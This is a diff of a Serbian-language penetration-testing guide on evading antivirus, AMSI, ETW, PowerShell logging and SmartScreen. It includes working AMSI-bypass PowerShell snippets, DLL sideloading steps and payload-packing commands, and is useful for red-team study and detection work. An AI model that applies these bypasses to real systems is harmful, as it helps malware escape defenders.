@@ -14,62 +14,62 @@ Statička detekcija se postiže označavanjem poznatih malicioznih stringova ili
 
 - **Enkripcija**
 
-Ako enkriptujete binarni fajl, neće biti načina za AV da detektuje vaš program, ali će vam biti potreban neki loader za dekripciju i pokretanje programa u memoriji.
+Ako enkriptujete binarni fajl, neće biti načina za AV da detektuje vaš program, ali će vam biti potreban neki loader da dekriptuje i pokrene program u memoriji.
 
 - **Obfuskacija**
 
-Ponekad je sve što treba da uradite da promenite neke stringove u vašem binarnom fajlu ili skripti da biste prošli AV, ali ovo može biti dugotrajan zadatak u zavisnosti od onoga što pokušavate da obfuskate.
+Ponekad je sve što treba da uradite da promenite neke stringove u vašem binarnom fajlu ili skripti da biste ga prošli AV, ali ovo može biti dugotrajan zadatak u zavisnosti od onoga što pokušavate da obfuskate.
 
 - **Prilagođeni alati**
 
-Ako razvijate svoje alate, neće biti poznatih loših potpisa, ali ovo zahteva mnogo vremena i truda.
+Ako razvijete svoje alate, neće biti poznatih loših potpisa, ali ovo zahteva mnogo vremena i truda.
 
 > [!NOTE]
 > Dobar način za proveru protiv Windows Defender statičke detekcije je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). U suštini deli datoteku na više segmenata i zatim traži od Defendera da skenira svaki pojedinačno, na ovaj način, može vam reći tačno koji su označeni stringovi ili bajtovi u vašem binarnom fajlu.
 
-Toplo preporučujem da pogledate ovu [YouTube playlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnoj AV Evasion.
+Toplo preporučujem da pogledate ovu [YouTube playlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnoj AV Evasiji.
 
 ### **Dinamička analiza**
 
-Dinamička analiza je kada AV pokreće vaš binarni fajl u sandbox-u i prati malicioznu aktivnost (npr. pokušaj dekripcije i čitanja lozinki iz vašeg pregledača, izvođenje minidump-a na LSASS-u, itd.). Ovaj deo može biti malo teži za rad, ali evo nekoliko stvari koje možete učiniti da izbegnete sandbox-e.
+Dinamička analiza je kada AV pokreće vaš binarni fajl u sandbox-u i prati malicioznu aktivnost (npr. pokušaj dekripcije i čitanja lozinki iz vašeg pretraživača, izvođenje minidump-a na LSASS, itd.). Ovaj deo može biti malo teži za rad, ali evo nekoliko stvari koje možete učiniti da izbegnete sandboksove.
 
-- **Sleep pre izvršenja** U zavisnosti od toga kako je implementirano, može biti odličan način za zaobilaženje dinamičke analize AV-a. AV-ima je potrebno vrlo malo vremena da skeniraju datoteke kako ne bi ometali rad korisnika, tako da korišćenje dugih sleep-ova može ometati analizu binarnih fajlova. Problem je što mnogi AV-ovi sandbox-i mogu jednostavno preskočiti sleep u zavisnosti od toga kako je implementirano.
-- **Proveravanje resursa mašine** Obično sandbox-i imaju vrlo malo resursa za rad (npr. < 2GB RAM), inače bi mogli usporiti korisničku mašinu. Takođe možete biti veoma kreativni ovde, na primer, proveravajući temperaturu CPU-a ili čak brzine ventilatora, ne mora sve biti implementirano u sandbox-u.
-- **Provere specifične za mašinu** Ako želite da ciljate korisnika čija je radna stanica pridružena "contoso.local" domenu, možete izvršiti proveru na domen mašine da vidite da li se poklapa sa onim što ste naveli, ako se ne poklapa, možete naterati svoj program da se zatvori.
+- **Sleep pre izvršenja** U zavisnosti od toga kako je implementirano, to može biti odličan način za zaobilaženje dinamičke analize AV-a. AV-ima je potrebno vrlo malo vremena da skeniraju datoteke kako ne bi ometali rad korisnika, pa korišćenje dugih sleep-ova može ometati analizu binarnih fajlova. Problem je što mnogi AV-ovi sandboksovi mogu jednostavno preskočiti sleep u zavisnosti od toga kako je implementirano.
+- **Proveravanje resursa mašine** Obično sandboksovi imaju vrlo malo resursa za rad (npr. < 2GB RAM), inače bi mogli usporiti korisničku mašinu. Takođe možete biti veoma kreativni ovde, na primer, proveravajući temperaturu CPU-a ili čak brzine ventilatora, ne sve će biti implementirano u sandboksu.
+- **Provere specifične za mašinu** Ako želite da ciljate korisnika čija je radna stanica pridružena "contoso.local" domenu, možete izvršiti proveru na domen mašine da vidite da li se poklapa sa onim što ste naveli, ako se ne poklapa, možete naterati svoj program da izađe.
 
-Ispostavlja se da je ime računara Microsoft Defender-ovog Sandbox-a HAL9TH, tako da možete proveriti ime računara u vašem malveru pre detonacije, ako se ime poklapa sa HAL9TH, to znači da ste unutar Defender-ovog sandbox-a, tako da možete naterati svoj program da se zatvori.
+Ispostavlja se da je ime računara Microsoft Defender-ovog sandboks-a HAL9TH, tako da možete proveriti ime računara u vašem malveru pre detonacije, ako se ime poklapa sa HAL9TH, to znači da ste unutar Defender-ovog sandboks-a, pa možete naterati svoj program da izađe.
 
 <figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
-Neki drugi zaista dobri saveti od [@mgeeky](https://twitter.com/mariuszbit) za borbu protiv sandbox-a
+Neki drugi zaista dobri saveti od [@mgeeky](https://twitter.com/mariuszbit) za borbu protiv sandboksova
 
 <figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanal</p></figcaption></figure>
 
-Kao što smo rekli ranije u ovom postu, **javni alati** će na kraju **biti otkriveni**, tako da biste trebali postaviti sebi pitanje:
+Kao što smo rekli ranije u ovom postu, **javni alati** će na kraju **biti otkriveni**, pa biste trebali da se zapitate nešto:
 
-Na primer, ako želite da dump-ujete LSASS, **da li zaista morate koristiti mimikatz**? Ili biste mogli koristiti neki drugi projekat koji je manje poznat i takođe dump-uje LSASS.
+Na primer, ako želite da dump-ujete LSASS, **da li vam zaista treba da koristite mimikatz**? Ili biste mogli koristiti neki drugi projekat koji je manje poznat i takođe dump-uje LSASS.
 
-Pravi odgovor je verovatno potonji. Uzimajući mimikatz kao primer, verovatno je jedan od, ako ne i najviše označenih komada malvera od strane AV-a i EDR-a, dok je projekat sam po sebi super cool, takođe je noćna mora raditi s njim da biste zaobišli AV-e, tako da jednostavno potražite alternative za ono što pokušavate da postignete.
+Pravi odgovor je verovatno potonji. Uzimajući mimikatz kao primer, verovatno je jedan od, ako ne i najviše označenih malvera od strane AV-a i EDR-a, dok je projekat sam po sebi super cool, takođe je noćna mora raditi s njim da biste zaobišli AV, pa samo potražite alternative za ono što pokušavate da postignete.
 
 > [!NOTE]
 > Kada modifikujete svoje payload-e za evaziju, obavezno **isključite automatsko slanje uzoraka** u defender-u, i molim vas, ozbiljno, **NE ULAŽITE NA VIRUSTOTAL** ako je vaš cilj postizanje evazije na duže staze. Ako želite da proverite da li vaš payload biva otkriven od strane određenog AV-a, instalirajte ga na VM, pokušajte da isključite automatsko slanje uzoraka, i testirajte ga tamo dok ne budete zadovoljni rezultatom.
 
-## EXE vs DLL
+## EXEs vs DLLs
 
-Kad god je to moguće, uvek **prioritizujte korišćenje DLL-ova za evaziju**, prema mom iskustvu, DLL datoteke su obično **mnogo manje otkrivene** i analizirane, tako da je to veoma jednostavan trik za korišćenje kako biste izbegli detekciju u nekim slučajevima (ako vaš payload ima neki način da se pokrene kao DLL naravno).
+Kad god je to moguće, uvek **prioritizujte korišćenje DLL-ova za evaziju**, prema mom iskustvu, DLL fajlovi su obično **mnogo manje otkriveni** i analizirani, tako da je to veoma jednostavan trik za korišćenje kako biste izbegli detekciju u nekim slučajevima (ako vaš payload ima neki način da se pokrene kao DLL, naravno).
 
 Kao što možemo videti na ovoj slici, DLL payload iz Havoc-a ima stopu detekcije od 4/26 na antiscan.me, dok EXE payload ima stopu detekcije od 7/26.
 
 <figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me poređenje normalnog Havoc EXE payload-a vs normalnog Havoc DLL-a</p></figcaption></figure>
 
-Sada ćemo pokazati neke trikove koje možete koristiti sa DLL datotekama da biste bili mnogo neprimetniji.
+Sada ćemo pokazati neke trikove koje možete koristiti sa DLL fajlovima da biste bili mnogo stealthier.
 
 ## DLL Sideloading & Proxying
 
 **DLL Sideloading** koristi prednost reda pretrage DLL-a koji koristi loader tako što postavlja i aplikaciju žrtve i maliciozni payload zajedno.
 
-Možete proveriti programe podložne DLL Sideloading-u koristeći [Siofra](https://github.com/Cybereason/siofra) i sledeći powershell skript:
-```powershell
+Možete proveriti programe podložne DLL Sideloading koristeći [Siofra](https://github.com/Cybereason/siofra) i sledeći powershell skript:
+```bash
 Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
 $binarytoCheck = "C:\Program Files\" + $_
 C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
@@ -77,7 +77,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 ```
 Ova komanda će prikazati listu programa podložnih DLL hijackingu unutar "C:\Program Files\\" i DLL datoteka koje pokušavaju da učitaju.
 
-Preporučujem vam da **istražite DLL hijackable/sideloadable programe sami**, ova tehnika je prilično suptilna kada se pravilno izvede, ali ako koristite javno poznate DLL sideloadable programe, lako možete biti uhvaćeni.
+Toplo preporučujem da **istražite DLL hijackable/sideloadable programe sami**, ova tehnika je prilično suptilna kada se pravilno izvede, ali ako koristite javno poznate DLL sideloadable programe, lako možete biti uhvaćeni.
 
 Samo postavljanje malicioznog DLL-a sa imenom koje program očekuje da učita, neće učitati vaš payload, jer program očekuje neke specifične funkcije unutar tog DLL-a. Da bismo rešili ovaj problem, koristićemo drugu tehniku nazvanu **DLL Proxying/Forwarding**.
 
@@ -92,7 +92,7 @@ Ovo su koraci koje sam pratio:
 3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
 4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
 ```
-Poslednja komanda će nam dati 2 fajla: šablon izvornog koda DLL-a i originalni preimenovani DLL. 
+Poslednja komanda će nam dati 2 fajla: šablon izvorne koda DLL-a i originalni preimenovani DLL. 
 
 <figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
 ```
@@ -105,11 +105,11 @@ Oba naša shellcode (kodirano sa [SGN](https://github.com/EgeBalci/sgn)) i proxy
 <figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>
 
 > [!NOTE]
-> **Toplo preporučujem** da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloadingu, kao i [ippsecov video](https://www.youtube.com/watch?v=3eROsG_WNpE) da biste saznali više o onome što smo detaljnije razgovarali.
+> **Preporučujem** da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloadingu, kao i [ippsecov video](https://www.youtube.com/watch?v=3eROsG_WNpE) da biste saznali više o onome što smo detaljnije razgovarali.
 
 ## [**Freeze**](https://github.com/optiv/Freeze)
 
-`Freeze je alat za isporuku za zaobilaženje EDR-a koristeći suspendovane procese, direktne syscalls i alternativne metode izvršavanja`
+`Freeze je alat za payload za zaobilaženje EDR-a koristeći suspendovane procese, direktne syscalls i alternativne metode izvršavanja`
 
 Možete koristiti Freeze da učitate i izvršite svoj shellcode na diskretan način.
 ```
@@ -145,28 +145,30 @@ Primetite kako dodaje `amsi:` i zatim putanju do izvršne datoteke iz koje je sk
 
 Nismo spustili nijednu datoteku na disk, ali smo ipak uhvaćeni u memoriji zbog AMSI.
 
+Štaviše, počevši od **.NET 4.8**, C# kod se takođe izvršava kroz AMSI. Ovo čak utiče na `Assembly.Load(byte[])` za učitavanje u memorijskoj izvršavanju. Zato se preporučuje korišćenje nižih verzija .NET-a (kao što su 4.7.2 ili niže) za izvršavanje u memoriji ako želite da izbegnete AMSI.
+
 Postoji nekoliko načina da se zaobiđe AMSI:
 
 - **Obfuskacija**
 
-Pošto AMSI uglavnom radi sa statičkim detekcijama, modifikovanje skripti koje pokušavate da učitate može biti dobar način za izbegavanje detekcije.
+Pošto AMSI uglavnom radi sa statičkim detekcijama, stoga, modifikovanje skripti koje pokušavate da učitate može biti dobar način za izbegavanje detekcije.
 
-Međutim, AMSI ima sposobnost da deobfuskira skripte čak i ako imaju više slojeva, tako da obfuskacija može biti loša opcija u zavisnosti od načina na koji je urađena. To čini izbegavanje ne tako jednostavnim. Ipak, ponekad, sve što treba da uradite je da promenite nekoliko imena promenljivih i bićete u redu, tako da zavisi koliko je nešto označeno.
+Međutim, AMSI ima sposobnost da neobfuskira skripte čak i ako imaju više slojeva, tako da obfuskacija može biti loša opcija u zavisnosti od načina na koji je urađena. Ovo čini izbegavanje ne tako jednostavnim. Ipak, ponekad, sve što treba da uradite je da promenite nekoliko imena promenljivih i bićete u redu, tako da zavisi koliko je nešto označeno.
 
 - **AMSI Bypass**
 
-Pošto je AMSI implementiran učitavanjem DLL-a u proces powershell (takođe cscript.exe, wscript.exe, itd.), moguće je lako manipulisati njime čak i kada se pokreće kao korisnik bez privilegija. Zbog ove greške u implementaciji AMSI, istraživači su pronašli više načina da izbegnu AMSI skeniranje.
+Pošto je AMSI implementiran učitavanjem DLL-a u proces powershell-a (takođe cscript.exe, wscript.exe, itd.), moguće je lako manipulisati njime čak i kada se pokreće kao korisnik bez privilegija. Zbog ove greške u implementaciji AMSI, istraživači su pronašli više načina da izbegnu AMSI skeniranje.
 
 **Prisiljavanje na grešku**
 
-Prisiljavanje AMSI inicijalizacije da ne uspe (amsiInitFailed) rezultiraće time da se nijedno skeniranje neće pokrenuti za trenutni proces. Prvobitno je ovo otkrio [Matt Graeber](https://twitter.com/mattifestation) i Microsoft je razvio potpis da spreči širu upotrebu.
-```powershell
+Prisiljavanje AMSI inicijalizacije da ne uspe (amsiInitFailed) će rezultirati time da nijedno skeniranje neće biti inicirano za trenutni proces. Prvobitno je ovo otkrio [Matt Graeber](https://twitter.com/mattifestation) i Microsoft je razvio potpis da spreči širu upotrebu.
+```bash
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
 Sve što je bilo potrebno je jedna linija powershell koda da se AMSI učini neupotrebljivim za trenutni powershell proces. Ova linija je naravno označena od strane AMSI-a, tako da su potrebne neke modifikacije da bi se koristila ova tehnika.
 
 Evo modifikovanog AMSI bypass-a koji sam uzeo iz ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
-```powershell
+```bash
 Try{#Ams1 bypass technic nº 2
 $Xdatabase = 'Utils';$Homedrive = 'si'
 $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
@@ -179,30 +181,57 @@ $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
 $Spotfix.SetValue($null,$true)
 }Catch{Throw $_}
 ```
-Imajte na umu da će ovo verovatno biti označeno kada ovaj post bude objavljen, tako da ne biste trebali objavljivati bilo koji kod ako je vaš plan da ostanete neotkriveni.
+Imajte na umu da će ovo verovatno biti označeno kada ovaj post bude objavljen, pa ne biste trebali objavljivati nikakav kod ako je vaš plan da ostanete neotkriveni.
 
 **Memory Patching**
 
-Ova tehnika je prvobitno otkrivena od strane [@RastaMouse](https://twitter.com/_RastaMouse/) i uključuje pronalaženje adrese za funkciju "AmsiScanBuffer" u amsi.dll (odgovornu za skeniranje korisnički unetih podataka) i prepisivanje iste sa instrukcijama da vrati kod za E_INVALIDARG, na ovaj način, rezultat stvarnog skeniranja će biti 0, što se tumači kao čist rezultat.
+Ova tehnika je prvobitno otkrivena od strane [@RastaMouse](https://twitter.com/_RastaMouse/) i uključuje pronalaženje adrese za funkciju "AmsiScanBuffer" u amsi.dll (odgovornu za skeniranje korisničkog unosa) i prepisivanje sa instrukcijama da vrati kod za E_INVALIDARG, na ovaj način, rezultat stvarnog skeniranja će biti 0, što se tumači kao čist rezultat.
 
 > [!NOTE]
 > Molimo vas da pročitate [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.
 
-Postoji mnogo drugih tehnika koje se koriste za zaobilaženje AMSI sa powershell-om, pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [ovaj repo](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.
+Takođe postoji mnogo drugih tehnika koje se koriste za zaobilaženje AMSI sa PowerShell-om, pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**ovaj repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.
 
-Ili ovaj skript koji će putem memory patching-a zakrpiti svaki novi Powersh
+Ovaj alat [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) takođe generiše skriptu za zaobilaženje AMSI.
+
+**Remove the detected signature**
+
+Možete koristiti alat kao što je **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da uklonite otkrivenu AMSI potpis iz memorije trenutnog procesa. Ovaj alat radi tako što skenira memoriju trenutnog procesa za AMSI potpis i zatim ga prepisuje sa NOP instrukcijama, efikasno ga uklanjajući iz memorije.
+
+**AV/EDR proizvodi koji koriste AMSI**
+
+Možete pronaći listu AV/EDR proizvoda koji koriste AMSI na **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.
+
+**Use Powershell version 2**
+Ako koristite PowerShell verziju 2, AMSI neće biti učitan, tako da možete pokretati svoje skripte bez skeniranja od strane AMSI. Možete to uraditi:
+```bash
+powershell.exe -version 2
+```
+## PS Logging
+
+PowerShell logging je funkcija koja vam omogućava da beležite sve PowerShell komande izvršene na sistemu. Ovo može biti korisno za reviziju i rešavanje problema, ali može biti i **problem za napadače koji žele da izbegnu otkrivanje**.
+
+Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:
+
+- **Onemogućite PowerShell transkripciju i logovanje modula**: Možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) u tu svrhu.
+- **Koristite Powershell verziju 2**: Ako koristite PowerShell verziju 2, AMSI neće biti učitan, tako da možete pokrenuti svoje skripte bez skeniranja od strane AMSI. Možete to uraditi: `powershell.exe -version 2`
+- **Koristite unmanaged PowerShell sesiju**: Koristite [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da pokrenete PowerShell bez odbrambenih mehanizama (to je ono što `powerpick` iz Cobalt Strike koristi).
 
 ## Obfuscation
 
+> [!NOTE]
+> Nekoliko tehnika obfuskacije se oslanja na enkripciju podataka, što će povećati entropiju binarnog koda, što će olakšati AV-ima i EDR-ima da ga otkriju. Budite oprezni s tim i možda primenite enkripciju samo na specifične delove vašeg koda koji su osetljivi ili treba da budu skriveni.
+
 Postoji nekoliko alata koji se mogu koristiti za **obfuskaciju C# koda u čistom tekstu**, generisanje **metaprogramskih šablona** za kompajliranje binarnih datoteka ili **obfuskaciju kompajliranih binarnih datoteka** kao što su:
 
+- [**ConfuserEx**](https://github.com/yck1509/ConfuserEx): To je odličan open-source obfuskator za .NET aplikacije. Pruža razne tehnike zaštite kao što su obfuskacija kontrolnog toka, anti-debugging, anti-tampering i enkripcija stringova. Preporučuje se jer omogućava čak i obfuskaciju specifičnih delova koda.
 - [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuskator**
 - [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da pruži open-source fork [LLVM](http://www.llvm.org/) kompilacione suite sposobne da pruži povećanu sigurnost softvera kroz [obfuskaciju koda](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zaštitu od neovlašćenih izmena.
-- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje kako koristiti `C++11/14` jezik za generisanje, u vreme kompajliranja, obfuskovanog koda bez korišćenja bilo kog spoljnog alata i bez modifikovanja kompajlera.
+- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstrira kako koristiti `C++11/14` jezik za generisanje, u vreme kompajliranja, obfuskovanog koda bez korišćenja bilo kog spoljnog alata i bez modifikovanja kompajlera.
 - [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuskovanih operacija generisanih C++ metaprogramskim okvirom koji će otežati život osobi koja želi da provali aplikaciju.
 - [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binarni obfuskator koji može obfuskovati razne različite pe datoteke uključujući: .exe, .dll, .sys
 - [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorfni kod motor za proizvoljne izvršne datoteke.
-- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je okvir za obfuskaciju koda sa finim granicama za jezike podržane od strane LLVM koristeći ROP (programiranje orijentisano na povratak). ROPfuscator obfuskira program na nivou asemblera transformišući obične instrukcije u ROP lance, ometajući naše prirodno shvatanje normalnog toka kontrole.
+- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je okvir za obfuskaciju koda sa finim granicama za jezike podržane od strane LLVM koristeći ROP (programiranje orijentisano na povratak). ROPfuscator obfuskira program na nivou asemblera transformišući obične instrukcije u ROP lance, ometajući naše prirodno shvatanje normalnog kontrolnog toka.
 - [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE kripter napisan u Nimu.
 - [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može konvertovati postojeće EXE/DLL u shellcode i zatim ih učitati.
 
@@ -210,27 +239,27 @@ Postoji nekoliko alata koji se mogu koristiti za **obfuskaciju C# koda u čistom
 
 Možda ste videli ovaj ekran kada ste preuzimali neke izvršne datoteke sa interneta i izvršavali ih.
 
-Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno zlonamernih aplikacija.
+Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno malicioznih aplikacija.
 
 <figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>
 
-SmartScreen uglavnom funkcioniše na osnovu reputacije, što znači da će neobično preuzete aplikacije aktivirati SmartScreen, upozoravajući i sprečavajući krajnjeg korisnika da izvrši datoteku (iako se datoteka i dalje može izvršiti klikom na Više informacija -> Pokreni u svakom slučaju).
+SmartScreen uglavnom funkcioniše na osnovu reputacije, što znači da će neobično preuzete aplikacije aktivirati SmartScreen, čime će upozoriti i sprečiti krajnjeg korisnika da izvrši datoteku (iako se datoteka i dalje može izvršiti klikom na Više informacija -> Pokreni u svakom slučaju).
 
-**MoTW** (Mark of The Web) je [NTFS Alternativni Podaci Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) sa imenom Zone.Identifier koji se automatski kreira prilikom preuzimanja datoteka sa interneta, zajedno sa URL-om sa kojeg je preuzeta.
+**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) sa imenom Zone.Identifier koji se automatski kreira prilikom preuzimanja datoteka sa interneta, zajedno sa URL-om sa kojeg je preuzeta.
 
 <figure><img src="../images/image (237).png" alt=""><figcaption><p>Proveravanje Zone.Identifier ADS za datoteku preuzetu sa interneta.</p></figcaption></figure>
 
 > [!NOTE]
 > Važno je napomenuti da izvršne datoteke potpisane **pouzdanom** potpisnom sertifikatom **neće aktivirati SmartScreen**.
 
-Veoma efikasan način da sprečite da vaši payload-i dobiju Mark of The Web je pakovanje u neki oblik kontejnera poput ISO-a. To se dešava zato što Mark-of-the-Web (MOTW) **ne može** biti primenjen na **non NTFS** volumene.
+Veoma efikasan način da sprečite da vaši payload-ovi dobiju Mark of The Web je pakovanje unutar nekog oblika kontejnera kao što je ISO. To se dešava jer Mark-of-the-Web (MOTW) **ne može** biti primenjen na **non NTFS** volumene.
 
 <figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>
 
-[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payload-e u izlazne kontejnere kako bi izbegao Mark-of-the-Web.
+[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payload-ove u izlazne kontejnere kako bi izbegao Mark-of-the-Web.
 
 Primer korišćenja:
-```powershell
+```bash
 PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso
 
 +      o     +              o   +      o     +              o
@@ -251,67 +280,85 @@ Adding file: /TotallyLegitApp.exe
 
 [+] Generated file written to (size: 3420160): container.iso
 ```
-Evo demonstracije za zaobilaženje SmartScreen-a pakovanjem payload-a unutar ISO datoteka koristeći [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)
+Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)
 
 <figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>
+
+## ETW
+
+Event Tracing for Windows (ETW) je moćan mehanizam za logovanje u Windows-u koji omogućava aplikacijama i sistemskim komponentama da **loguju događaje**. Međutim, može se koristiti i od strane bezbednosnih proizvoda za praćenje i otkrivanje zlonamernih aktivnosti.
+
+Slično kao što je AMSI onemogućen (zaobiđen), takođe je moguće učiniti da **`EtwEventWrite`** funkcija korisničkog prostora odmah vrati bez logovanja bilo kakvih događaja. To se postiže patch-ovanjem funkcije u memoriji da odmah vrati, efikasno onemogućavajući ETW logovanje za taj proces.
+
+Možete pronaći više informacija na **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.
 
 ## C# Assembly Reflection
 
 Učitavanje C# binarnih datoteka u memoriju je poznato već neko vreme i još uvek je veoma dobar način za pokretanje vaših alata nakon eksploatacije bez da vas uhvate AV.
 
-Pošto će payload biti učitan direktno u memoriju bez dodirivanja diska, moraćemo se brinuti samo o patchovanju AMSI tokom celog procesa.
+Pošto će se payload učitati direktno u memoriju bez dodirivanja diska, moraćemo se brinuti samo o patch-ovanju AMSI za ceo proces.
 
 Većina C2 okvira (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) već pruža mogućnost izvršavanja C# assembly-a direktno u memoriji, ali postoje različiti načini za to:
 
 - **Fork\&Run**
 
-Ovo uključuje **pokretanje novog žrtvenog procesa**, injektovanje vašeg malicioznog koda nakon eksploatacije u taj novi proces, izvršavanje vašeg malicioznog koda i kada završite, ubijanje novog procesa. Ovo ima svoje prednosti i nedostatke. Prednost metode fork and run je što se izvršavanje dešava **van** našeg Beacon implant procesa. To znači da ako nešto u našoj akciji nakon eksploatacije pođe po zlu ili bude uhvaćeno, postoji **mnogo veća šansa** da naš **implant preživi.** Nedostatak je što imate **veću šansu** da budete uhvaćeni od strane **Behavioral Detections**.
+Ovo uključuje **pokretanje novog žrtvenog procesa**, injektovanje vašeg zlonamernog koda u taj novi proces, izvršavanje vašeg zlonamernog koda i kada završite, ubijanje novog procesa. Ovo ima svoje prednosti i nedostatke. Prednost metode fork and run je u tome što se izvršavanje dešava **izvan** našeg Beacon implant procesa. To znači da ako nešto u našoj akciji nakon eksploatacije pođe po zlu ili bude uhvaćeno, postoji **mnogo veća šansa** da naš **implant preživi.** Nedostatak je u tome što imate **veću šansu** da budete uhvaćeni od strane **Behavioral Detections**.
 
 <figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>
 
 - **Inline**
 
-Radi se o injektovanju malicioznog koda nakon eksploatacije **u sopstveni proces**. Na ovaj način, možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV, ali nedostatak je što ako nešto pođe po zlu sa izvršavanjem vašeg payload-a, postoji **mnogo veća šansa** da **izgubite svoj beacon** jer bi mogao da se sruši.
+Radi se o injektovanju zlonamernog koda nakon eksploatacije **u sopstveni proces**. Na ovaj način, možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV, ali nedostatak je u tome što ako nešto pođe po zlu sa izvršavanjem vašeg payload-a, postoji **mnogo veća šansa** da **izgubite svoj beacon** jer bi mogao da se sruši.
 
 <figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>
 
 > [!NOTE]
 > Ako želite da pročitate više o učitavanju C# Assembly-a, molimo vas da pogledate ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
 
-Takođe možete učitati C# Assembly-e **iz PowerShell-a**, pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [video S3cur3th1sSh1t-a](https://www.youtube.com/watch?v=oe11Q-3Akuk).
+Takođe možete učitati C# Assembly-e **iz PowerShell-a**, pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [S3cur3th1sSh1t-ov video](https://www.youtube.com/watch?v=oe11Q-3Akuk).
 
-## Korišćenje drugih programskih jezika
+## Using Other Programming Languages
 
